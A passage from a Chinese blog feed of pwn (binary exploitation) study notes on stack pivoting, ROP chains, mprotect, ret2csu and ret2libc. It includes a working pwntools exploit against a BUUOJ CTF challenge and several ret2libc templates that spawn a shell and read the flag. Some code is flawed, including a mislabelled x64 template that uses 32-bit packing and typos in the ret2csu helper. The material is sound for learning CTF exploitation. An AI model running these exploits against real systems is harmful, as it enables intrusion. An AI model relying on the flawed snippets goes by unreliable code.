        <content type="html"><![CDATA[<h1 id="花式栈溢出-栈迁移"><a href="#花式栈溢出-栈迁移" class="headerlink" title="花式栈溢出 - 栈迁移"></a>花式栈溢出 - 栈迁移</h1><h2 id="0x1-：基本知识："><a href="#0x1-：基本知识：" class="headerlink" title="0x1 ：基本知识："></a>0x1 ：基本知识：</h2><p>栈迁移技术来解决的问题：溢出的长度不够，只能覆盖到返回地址，以至于后面无法构造需要构造的rop链。</p><p>前置知识：了解C语言是如何调用栈的</p><p>栈迁移用到的最关键的两个汇编指令是：leave和ret指令。其作用就是用来还原栈空间的。</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/a3da18c4a1d547cdb649ac61902b6889.png" alt="a3da18c4a1d547cdb649ac61902b6889"></p><p>其作用的结果图大概就是下面这样（下面是调用函数时开辟的栈空间）：<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-16378953626282.png"></p><h2 id="0x2-：利用思路-："><a href="#0x2-：利用思路-：" class="headerlink" title="0x2 ：利用思路 ："></a>0x2 ：利用思路 ：</h2><p>利用前提：<br>（1）存在两个变量的输入，如果只能输入一次的话，那必然无法造成溢出，其中一个输入buf变量刚好能溢出到返回地址，而另一个输入变量s的内容应该是存放到bss段或者其他。</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-16378953680604.png"></p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/9ac4318f4c874843a88023d4c718d56f.png" alt="在这里插入图片描述"></p><p>利用思路：一个栈空间长度不够，我既然能够输入两次，那我为什么不把这两个栈空间串联起来，就像把它变成一个栈一样（当然实质并不是这样的），这样的栈空间不就足够了吗？重点就是怎么样把两个栈串联起来呢？关键就是就是依靠leave和ret指令。</p><p>首先我们知道调用函数时栈的过程会保存栈布局，并且会移动ebp、esp以此来形成新的栈帧。那和leave ret指令有什么关系呢？</p><p>首先我们要知道栈迁移的payload的构成。下面是以32位的libc题型为例画的示意图</p><pre><code class="c">payload1 = p32(write_plt_addr) + p32(main_addr) + p32(1) + p32(write_got_addr) + p32(4)payload2 = offset*&#39;a&#39; + p32(bss_addr-4) + p32(leave_ret_addr)</code></pre><p>最终的效果其实就是和泄露libc时的一样，只不过多了一个leave_ret地址，而且由一个payload变成了两个payload。加上函数调用完以后本身会执行leave和ret指令，这样就有两个了，反复利用leave和ret指令以此来达到栈迁移的目的。</p><p>下面是payload在栈上面的布局情况：<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-16378953704046.png"></p><p>我们重点来讲一讲函数调用完以后的返回过程，两个空间是怎么样串联起来的。</p><p>（1）第一个leave指令：它先将栈空间清空，将esp弄了回来，然后将（构造好的空间的地址-4）传给了ebp。那为什么地址要减4，这是就和第二个leave指令有关了，之后会有解释。</p><p>此时的栈内空间变化：<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAc3dlZHNu,size_20,color_FFFFFF,t_70,g_se,x_16.png"></p><p>（2）第一个ret指令：它将带有leave和ret指令的地址传给了eip，那么接下来程序又会跳转到leave处。<br>此时的栈空间变化：<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAc3dlZHNu,size_20,color_FFFFFF,t_70,g_se,x_16-16378953744519.png"></p><p>（3）第二个leave指：其实类似C语言调用栈过程（不过是相反的）。这里先mov esp ebp，然后再pop ebp。<br>bss-4的原因：这里由于需要再一次pop ebp，所以导致esp会变成esp的地址会加上4（32位），这也是为什么我们设置的bss段的地址要减去4，这样这样esp+4 &#x3D; bss_addr，而我们构造的payload的地址是从bss_addr开始的，只有这样我们才能准确的执行。如果你将地址写成bss段，就会导致esp &#x3D; bss_addr +4,然后执行预留返回地址，不会执行write_plt_addr。<br>这里需要提醒的是：这里是在bss段，并不是真的在栈当中，所以说之后的esp、ebp地址的变化其实并不需要管。只需要知道程序它会向下继续执行。</p><p>此时的栈空间变化：<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-163789537708311.png"></p><p>（4）第二个ret指令：将write_plt_addr传给eip，执行write函数。</p><p>注意：bss段是从低地址向高地址往高地址增长，所以这是为什么esp在ebp的下面的原因。重点要知道的是他们之间的栈是怎么样的布局的，</p><p>总共返回时的流程为：</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-163789537887013.png"></p><h2 id="0x3-：实例讲解"><a href="#0x3-：实例讲解" class="headerlink" title="0x3 ：实例讲解"></a>0x3 ：实例讲解</h2><p>题目链接：<a href="https://buuoj.cn/challenges#%5BBlack%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98%5DPWN">[Black Watch 入群题]PWN</a></p><p>程序分析：**<font color=red >32位程序，开启了NX保护</font>**。打开IDA，查看一下源代码<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-163789538154015.png"><br>代码分析：上文分析过了，漏洞利用：栈迁移技巧，然后发现没有system函数而且开启了NX保护，所以利用libc的来泄露system函数。本题：栈迁移 + libc。</p><p>exp ：</p><pre><code class="python">from pwn import *#r = process(&quot;./pwn&quot;)r = remote(&quot;node4.buuoj.cn&quot;,26026)e = ELF(&quot;./pwn&quot;)context(log_level = &#39;debug&#39;)libc = ELF(&quot;./libc-2.23.so&quot;)write_plt_addr = e.plt[&quot;write&quot;]write_got_addr = e.got[&quot;write&quot;]main_addr = e.symbols[&quot;main&quot;]bss_addr = 0x0804A300leave_ret_addr = 0x08048511 payload1 = p32(write_plt_addr) + p32(main_addr) + p32(1) + p32(write_got_addr) + p32(4)r.recvuntil(&quot;What is your name?&quot;)r.sendline(payload1)offset = 0x18payload2 = offset*&#39;a&#39; + p32(bss_addr-4) + p32(leave_ret_addr)r.recvuntil(&quot;What do you want to say?&quot;)r.send(payload2)write_addr = u32(r.recv(4))print(hex(write_addr))#pause()base_addr = write_addr - libc.symbols[&quot;write&quot;]system_addr = base_addr + libc.symbols[&quot;system&quot;]binsh_addr = base_addr + libc.search(&quot;/bin/sh&quot;).next()payload3 = p32(system_addr) + p32(1) + p32(binsh_addr)r.recvuntil(&quot;What is your name?&quot;)r.sendline(payload3)payload4 = offset*&#39;a&#39; + p32(bss_addr-4) + p32(leave_ret_addr)r.recvuntil(&quot;What do you want to say?&quot;)r.sendline(payload4)r.sendline(&quot;cat flag&quot;)r.interactive()</code></pre><p>这里有一个需要注意的点就是，第二个payload发送是用的send，而不是sendline，这里我卡了半天。我觉得这和read函数的读取机制有关系，因为read函数是会读取\n的，当你发送的内容没有溢出的话，它会输出下来，但是当你溢出时他只会输出最多的字节数。具体的原理我也是还没搞懂。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>栈迁移就是将这个空间不够的栈劫持（转移）到我能够写入的一个地方，只要这个地方的内容我提前布局好，就能想你想做的事情，我觉得就是两个栈空间结合起来，以此来扩大空间。</p><p>其实如果不是很懂得话，只需要记住：两个payload加起来，然后与之前的想必中间多了一个bss_addr和leave_ret_addr，并且偏移量只是到ebp处。但是如果只是知道做题而不懂原理我是一点作用都没有的，不要为了做题而做题，做题是为了掌握知识点。</p>]]></content>
      
      
      <categories>
          
          <category> Pwn入门 </category>
          
          <category> 栈溢出 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pwn学习笔记-一键获取flag</title>
      <link href="/2022/07/12/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA-%E4%B8%80%E9%94%AE%E8%8E%B7%E5%8F%96flag/"/>
      <url>/2022/07/12/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA-%E4%B8%80%E9%94%AE%E8%8E%B7%E5%8F%96flag/</url>
      
        <content type="html"><![CDATA[<h1 id="花式栈溢出—一键获取flag"><a href="#花式栈溢出—一键获取flag" class="headerlink" title="花式栈溢出—一键获取flag"></a>花式栈溢出—一键获取flag</h1><p>参考链接：<a href="https://www.itdaan.com/blog/2017/05/19/daeb483344efc869d1ec1c5ff3b192bd.html">https://www.itdaan.com/blog/2017/05/19/daeb483344efc869d1ec1c5ff3b192bd.html</a></p><h2 id="1-使用前提："><a href="#1-使用前提：" class="headerlink" title="1. 使用前提："></a>1. 使用前提：</h2><blockquote><ol><li>溢出的大小足够大，写入地址足够大</li><li>没有EIP</li><li>能搜索到ROP链（最重要的要求）</li></ol></blockquote><h2 id="2-使用方式："><a href="#2-使用方式：" class="headerlink" title="2. 使用方式："></a>2. 使用方式：</h2><h3 id="（1）搜索rop链"><a href="#（1）搜索rop链" class="headerlink" title="（1）搜索rop链"></a>（1）搜索rop链</h3><pre><code>ROPgadget --binary ./pwn --ropchain</code></pre><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20211126151939627.png" alt="image-20211126151939627"></p><h3 id="（2）直接写脚本"><a href="#（2）直接写脚本" class="headerlink" title="（2）直接写脚本"></a>（2）直接写脚本</h3><pre><code>#!/usr/bin/env pythonfrom pwn import *p = process(&#39;./exp4&#39;)#p = remote(&#39;127.0.0.1&#39;,10001)payload = &#39;A&#39; * 136payload += p64(0x00000000004017a7) # pop rsi ; ret                    ......将之前搜索到的rop链的地址复制上来复制上来                    ......payload += p64(0x000000000045b0d5) # syscall ; retp.send(payload)p.interactive()</code></pre><h2 id="3-搜索rop链"><a href="#3-搜索rop链" class="headerlink" title="3. 搜索rop链"></a>3. 搜索rop链</h2><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20211126152425186.png" alt="image-20211126152425186"></p><p>一般来搜索ROP链时都是出现的这样的情况：</p><blockquote><p>一ROPgadget自动生成ROP链所需要的gadget：mov qword ptr [r64], r64找不到。</p></blockquote><p>这是因为编译时 没有将所有需要的函数库集成进编译出来的程序上面，静态链接所有需要的库文件</p><p>只需要在编译到时候加上   “-static” 就可以出现rop链了</p><pre><code>gcc -fno-stack-protector -static -o exp exp.c</code></pre>]]></content>
      
      
      <categories>
          
          <category> Pwn入门 </category>
          
          <category> 栈溢出 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>花式栈溢出-mprotect绕过NX保护</title>
      <link href="/2022/07/12/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA-mprotect%E7%BB%95%E8%BF%87NX%E4%BF%9D%E6%8A%A4/"/>
      <url>/2022/07/12/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA-mprotect%E7%BB%95%E8%BF%87NX%E4%BF%9D%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​现在的大部分程序都会在编译时开启NX保护，这样我们就无法向栈上注入shellcode从而获得一个shell；只能利用其他手段来泄露sytem函数的地址（ret2libc、dynELF）。 但是当程序存在mprotect函数时，我们通过mprotect函数来修改某个程序段的权限从而让这个段可执行，以此来绕过NX保护。（当然当程序不可使用system函数时，也可使用此方法）</p><h2 id="0x1：mprotect函数"><a href="#0x1：mprotect函数" class="headerlink" title="0x1：mprotect函数"></a>0x1：mprotect函数</h2><p>函数原型：</p><pre><code class="c">int mprotect(void *addr, size_t len, int prot)mprotect函数把从start开始的，长度为len的内存区的保护属性修改为prot指定的值    第一个参数：开始地址（该地址是0x1000的倍数， 以页方式对齐）第二个参数：指定长度（修改权限的长度， 长度也应该是0x1000的倍数）第三个参数：指定修改的权限（与linux下文件权限相类似，1表示可执行、2表示可写、4表示可读。一般为7表示可读可写可执行）</code></pre><h2 id="0x2：验证mprotect函数"><a href="#0x2：验证mprotect函数" class="headerlink" title="0x2：验证mprotect函数"></a>0x2：验证mprotect函数</h2><p>（1）编写以个C语言程序</p><pre><code class="c">#include&lt;stdio.h&gt;#include &lt;sys/mman.h&gt;int main()&#123;    void *addr;    addr = 0x555555554000;    mprotect(addr, 0x1000, 7);    return 0;&#125;</code></pre><p>（2）gcc编译</p><blockquote><p>gcc test.c -o test</p></blockquote><p>（3）用vmmap查看执行mprotect前面程序的权限的变化。可以发现程序增加了可读的权限</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220207224656792.png" alt="image-20220207224656792"></p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220207224724684.png" alt="image-20220207224724684"></p><h2 id="0x3：实例解析"><a href="#0x3：实例解析" class="headerlink" title="0x3：实例解析"></a>0x3：实例解析</h2>]]></content>
      
      
      <categories>
          
          <category> Pwn入门 </category>
          
          <category> 栈溢出 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pwn学习笔记-ret2csu</title>
      <link href="/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ret2csu/"/>
      <url>/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ret2csu/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前提知识"><a href="#1-前提知识" class="headerlink" title="1. 前提知识"></a>1. 前提知识</h2><p>（1）64位程序中函数的传参方式：</p><blockquote><p>当参数个数少于7给时，通过寄存器传参，参数从左到右放入寄存器中：rdi、rsi、rdx、rcx、r8、r9</p><p>当参数大于等于7个时，前6个参数与前面一样，后面的参数依次放入栈中，通过栈传参（与32位一样）</p></blockquote><p>（2）存在的问题</p><p> 这样在64位中就存在一个问题：当我们找不到某一个寄存器对应的 gadgets时，那么就无法找到存放函数该参数的地方了，就无法构造函数了。一般情况是：函数有三个参数，而程序的rdx寄存器对应的gadget在程序中找不到，但这个三个参数又很重要。那么这样就得利用程序本身的其他函数来构造这个gadget了。 </p><h2 id="2-ret2csu的原理"><a href="#2-ret2csu的原理" class="headerlink" title="2. ret2csu的原理"></a>2. ret2csu的原理</h2><p>在 64程序 下存在一个叫 __libc_csu_init 的函数，这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。通过利用这个函数来构造相应的寄存器的数值。</p><p>我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)</p><pre><code class="assembly">text:0000000000400760 ; void init(void).text:0000000000400760 init            proc near               ; DATA XREF: start+16↑o.text:0000000000400760 ; __unwind &#123;.text:0000000000400760                 push    r15.text:0000000000400762                 push    r14.text:0000000000400764                 mov     r15d, edi.text:0000000000400767                 push    r13.text:0000000000400769                 push    r12.text:000000000040076B                 lea     r12, off_600E10.text:0000000000400772                 push    rbp.text:0000000000400773                 lea     rbp, off_600E18.text:000000000040077A                 push    rbx.text:000000000040077B                 mov     r14, rsi.text:000000000040077E                 mov     r13, rdx.text:0000000000400781                 sub     rbp, r12.text:0000000000400784                 sub     rsp, 8.text:0000000000400788                 sar     rbp, 3.text:000000000040078C                 call    _init_proc.text:0000000000400791                 test    rbp, rbp.text:0000000000400794                 jz      short loc_4007B6.text:0000000000400796                 xor     ebx, ebx.text:0000000000400798                 nop     dword ptr [rax+rax+00000000h].text:00000000004007A0.text:00000000004007A0 loc_4007A0:                             ; CODE XREF: init+54↓j.text:00000000004007A0                 mov     rdx, r13.text:00000000004007A3                 mov     rsi, r14.text:00000000004007A6                 mov     edi, r15d.text:00000000004007A9                 call    qword ptr [r12+rbx*8].text:00000000004007AD                 add     rbx, 1.text:00000000004007B1                 cmp     rbx, rbp.text:00000000004007B4                 jnz     short loc_4007A0.text:00000000004007B6.text:00000000004007B6 loc_4007B6:                             ; CODE XREF: init+34↑j.text:00000000004007B6                 add     rsp, 8.text:00000000004007BA                 pop     rbx.text:00000000004007BB                 pop     rbp.text:00000000004007BC                 pop     r12.text:00000000004007BE                 pop     r13.text:00000000004007C0                 pop     r14.text:00000000004007C2                 pop     r15.text:00000000004007C4                 retn.text:00000000004007C4 ; &#125; // starts at 400760.text:00000000004007C4 init            endp</code></pre><p>这里我们可以利用以下几点：</p><ul><li>从 0x00000000004007B6 一直到结尾，存在有6个pop指令，我们可以利用栈溢出，然后构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。（控制这些寄存器的值的作用就是通过结合前一个函数，然后将这些寄存器的数据赋给rdx、rsi、rdi寄存器，这样就可以构造gadget，实现函数跳转了）</li><li>接着确定ret的返回地址，返回到 loc_4007B6 函数中，传递构造好的寄存器的数据，从 0x00000000004007A0 到 0x00000000004007A9，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0</strong>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，那么r12 为存储我们想要调用的函数的地址。</li><li>从 0x00000000004007AD 到 0x00000000004006B4，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 &#x3D; rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx&#x3D;0，rbp&#x3D;1。</li><li>然后再往下执行程序，为了堆栈平衡。就是说,当ret_addr执行完之后,按照流程它会继续往下执行loc_400646函数,如果它执行的话，他就会再次 pop寄存器，更换我们已经布置好的内容。所以为了堆栈平衡，我们使用垃圾数据填充此处的代码（栈区和代码区同属于内存区域，可以被填充），这里的大小位0x38。此时程序有到达了ret返回函数的地址处了，然后再在最后ret时改写为main函数的地址。这样就可以既可以获取write函数的地址，而且其本身又可以重新执行main函数</li></ul><p>流程图：</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20211126172951142.png" alt="image-20211126172951142"></p><p>函数构造：</p><pre><code class="python">offset = csu_start_addr = csu_end_addrdef rcsu(rbx, rbp, r12, r13 , r14 , r15, ret_addr):    pyaload = offset * &#39;a&#39;    payload += p64(csu_start_addr)    payload += &quot;ret_addr&quot;# 程序在调用函数时都会先构造pop一个预留一个返回地址，方便调用函数后回去，由于这里该函数得到最后存在ret指令所以不需要提前填可随意填充    payload += p64(0x0)     # rbx = 0x0    payload += p64(0x1)     # rbp = 0x1     payload += p64(r12)     # r12 = call_addr    payload += p64(r13)     # r13 = rdx call_addr函数的第三个参数    payload += p64(r14)     # r14 = rsi call_addr函数的第二个参数    payload += p64(r15)     # r15 = edi call_addr函数的第一个参数    payload += p64(csu_end_addr)# 这里一般为这个函数的前一个函数地址，因为需要将pop的内容传递到rdx、rsi、edi寄存器当中    payload += &#39;A&#39; * 56 # 这里需要注意：如果程序需要多次调用这段可以再次使用，而不是填充为垃圾数据    payload += p64(ret_addr)    r.sendline(payload)</code></pre><ul><li>这样构造的好处：比如说你可以通过call指令泄露某个函数的地址，然而却不改变程序的流程，让它重新执行程序，就是说可以重复多次利用溢出漏洞，而且相比之下存在更多的gadget可以利用。</li><li>利用：利用的方式有很多，通常都是用来泄露函数的地址（绕过pie的保护、泄露libc的基地址）</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Pwn学习笔记-ret2libc模板</title>
      <link href="/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ret2libc%E6%A8%A1%E6%9D%BF/"/>
      <url>/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ret2libc%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<p>（1）puts_exp.py</p><pre><code class="python">from pwn import *local = 1e = ELF(&quot;./pwn&quot;)if local == 1:    r = process(&quot;./pwn&quot;)    #libc = ELF(&quot;&quot;)    # context(log_level = &#39;debug&#39;)else :    r = remote(&quot;&quot;)    libc = ELF(&quot;&quot;)    # context(log_level = &#39;debug&#39;)puts_plt_addr = e.plt[&quot;puts&quot;]puts_got_addr = e.got[&quot;puts&quot;]main_addr = e.symbols[&quot;main&quot;]offset = payload1 = offset*&#39;a&#39; + p32(puts_plt_addr) + p32(main_addr) + p32(puts_got_addr)#r.recvuntil()r.sendline(payload1)puts_addr = u32(r.recv(4))print(hex(puts_addr))#pause()base_addr = puts_addr - libc.symbols[&quot;puts&quot;]system_addr = base_addr + libc.symbols[&quot;system&quot;]binsh_addr = base_addr + libc.search(&quot;/bin/sh&quot;).next()payload2 = offset*&#39;a&#39; + p32(system_addr) + p32(main_addr) + p32(binsh_addr)#r.recvuntil()r.sendline(payload2)r.sendline(&quot;cat flag&quot;)r.interactive()</code></pre><p>（2）puts_x64_exp.py</p><pre><code class="python">from pwn import *local = 1e = ELF(&quot;./pwn&quot;)if local == 1:    r = process(&quot;./pwn&quot;)    #libc = ELF(&quot;&quot;)    # context(log_level = &#39;debug&#39;)else :    r = remote(&quot;&quot;)    libc = ELF(&quot;&quot;)    # context(log_level = &#39;debug&#39;)puts_plt_addr = e.plt[&quot;puts&quot;]puts_got_addr = e.got[&quot;puts&quot;]main_addr = e.symbols[&quot;main&quot;]rdi_addr_ret = offset = payload1 = offset*&#39;a&#39; + p64(rdi_addr_ret) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr)#r.recvuntil()r.sendline(payload1)puts_addr = u64(r.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))print(hex(puts_addr))#pause()base_addr = puts_addr - libc.symbols[&quot;puts&quot;]system_addr = base_addr + libc.symbols[&quot;system&quot;]binsh_addr = base_addr + libc.search(&quot;/bin/sh&quot;).next()payload2 = offset*&#39;a&#39; + p64(rdi_addr_ret) + p64(binsh_addr) + p64(system_addr) + p64(1)#r.recvuntil()r.sendline(payload2)r.sendline(&quot;cat flag&quot;)r.interactive()</code></pre><p>（3）write_exp.py</p><pre><code class="python">from pwn import *local = 1e = ELF(&quot;./pwn&quot;)if local == 1:    r = process(&quot;./pwn&quot;)    #libc = ELF(&quot;&quot;)    # context(log_level = &#39;debug&#39;)else :    r = remote(&quot;&quot;)    libc = ELF(&quot;&quot;)    # context(log_level = &#39;debug&#39;)write_plt_addr = e.plt[&quot;write&quot;]write_got_addr = e.got[&quot;write&quot;]main_addr = e.symbols[&quot;main&quot;]offset = payload = offset*&#39;a&#39; + p32(write_plt_addr) + p32(main_addr) + p32(1) + p32(write_got_addr) + p32(4)#r.recvuntil()r.sendline(payload)write_addr = u32(r.recv(4))print(hex(write_addr))#pause()base_addr = write_addr - libc.symbols[&quot;write&quot;]system_addr = base_addr + libc.symbols[&quot;system&quot;]binsh_addr = base_addr + libc.search(&quot;/bin/sh&quot;).next()payload = offset*&#39;a&#39; + p32(system_addr) + p32(1) + p32(binsh_addr)#r.recvuntil()r.sendline(payload)r.sendline(&quot;cat flag&quot;)r.interactive()</code></pre><p>（4）write_x64_exp.py</p><pre><code class="python">from pwn import *local = 1e = ELF(&quot;./pwn&quot;)if local == 1:    r = process(&quot;./pwn&quot;)    #libc = ELF(&quot;&quot;)    # context(log_level = &#39;debug&#39;)else :    r = remote(&quot;&quot;)    libc = ELF(&quot;&quot;)    # context(log_level = &#39;debug&#39;)write_plt_addr = e.plt[&quot;write&quot;]write_got_addr = e.got[&quot;write&quot;]main_addr = e.symbols[&quot;main&quot;]offset = payload = offset*&#39;a&#39; + p32(write_plt_addr) + p32(main_addr) + p32(1) + p32(write_got_addr) + p32(4)#r.recvuntil()r.sendline(payload)write_addr = u32(r.recv(4))print(hex(write_addr))#pause()base_addr = write_addr - libc.symbols[&quot;write&quot;]system_addr = base_addr + libc.symbols[&quot;system&quot;]binsh_addr = base_addr + libc.search(&quot;/bin/sh&quot;).next()payload = offset*&#39;a&#39; + p32(system_addr) + p32(1) + p32(binsh_addr)#r.recvuntil()r.sendline(payload)r.sendline(&quot;cat flag&quot;)r.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> Pwn入门 </category>
          
          <category> 栈溢出 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pwn学习笔记-栈溢出基本原理</title>
      <link href="/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"/>
      <url>/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="一、栈与栈帧"><a href="#一、栈与栈帧" class="headerlink" title="一、栈与栈帧"></a>一、栈与栈帧</h2><h3 id="1、栈"><a href="#1、栈" class="headerlink" title="1、栈"></a>1、栈</h3><p>（1）栈是一种典型的后进先出的数据结构，其操作主要有压栈（push）与出栈（pop）两种操作</p><p>（2）用于保存函数调用信息和局部变量</p><p>x86：函数参数保存在栈上，在函数返回地址的上方</p><p>x64：前六个政协或指针参数以此保存在RDI,RSI,RDX,R8,R9寄存器种，如果还有更多的参数的话才会保存在栈上</p><h3 id="2、栈帧"><a href="#2、栈帧" class="headerlink" title="2、栈帧"></a>2、栈帧</h3><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220403142423167.png" alt="image-20220403142423167"></p><h2 id="二、C语言函数调用栈"><a href="#二、C语言函数调用栈" class="headerlink" title="二、C语言函数调用栈"></a>二、C语言函数调用栈</h2><h3 id="1、编写源代码编译"><a href="#1、编写源代码编译" class="headerlink" title="1、编写源代码编译"></a>1、编写源代码编译</h3><p>（1）源代码</p><pre><code class="c">#include &lt;stdio.h&gt;int test(int a, int b)&#123;    int c = a + b;    return c;&#125;int main(int argc, char const *argv[])&#123;    int d = test(1, 2);&#125;</code></pre><p>（2）编译</p><blockquote><p>gcc -m32 -o test test.c</p></blockquote><h3 id="2-、分析程序："><a href="#2-、分析程序：" class="headerlink" title="2 、分析程序："></a>2 、分析程序：</h3><h4 id="0x1：进入函数前"><a href="#0x1：进入函数前" class="headerlink" title="0x1：进入函数前"></a>0x1：进入函数前</h4><p>① 首先查看程序的main函数的反汇编。前面三行的作用就是开辟一段栈帧，其大小就是0x10</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220403151407975.png" alt="image-20220403151407975"></p><p>此时的栈帧的布局为：</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220403154502676.png" alt="image-20220403154502676"></p><p>② 接着可以发现在调用func函数的时候，它首先传递了func函数的两个参数（从右往左）</p><p>注意：</p><blockquote><p>32位程序和64位程序的传参方式不一样，32位程序是栈传参，而64位优先寄存器传参，寄存器总共有六个：rdi、rsi、rdx、rcx、r8、r9，当参数多于七个时才轮到栈传参</p></blockquote><p>③  传参以后就是执行call指令。call指令实际上包含两个指令</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/e94a2f01edbd4400843c951c62c5a397-16424329962017.png" alt="e94a2f01edbd4400843c951c62c5a397"></p><p>在这里就是先将0x08048400的地址保存起来，然后再跳转到call的后面的地址0x80483db <func>， 此时的栈帧的布局应该是</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220403155106777.png" alt="image-20220403155106777"></p><h4 id="0x2-：进入函数时："><a href="#0x2-：进入函数时：" class="headerlink" title="0x2 ：进入函数时："></a>0x2 ：进入函数时：</h4><p>跳到fun函数里面，查看一下汇编代码：</p><p>重点讲一下前的三行，基本上每一个程序都有这三个指令，那么它们有什么作用呢？</p><p><strong>push ebp：</strong> 将主调函数（main函数）的ebp保存下来，为了就是调用完这个函数以后以后跟调用之前的一样。</p><p><strong>mov ebp, esp：</strong> 将ebp栈底抬上去，什么意思呢？就是之前的ebp的地址不是main函数的吗，而esp是栈顶，随着你的输入输出而改变的，mov指令就是将你的ebp放到最上面。</p><p><strong>sub esp，10h：</strong> 为新栈开辟一段内存空间，其大小为0x10.</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-163789545506625.png"></p><p>最终的结果：<br><img 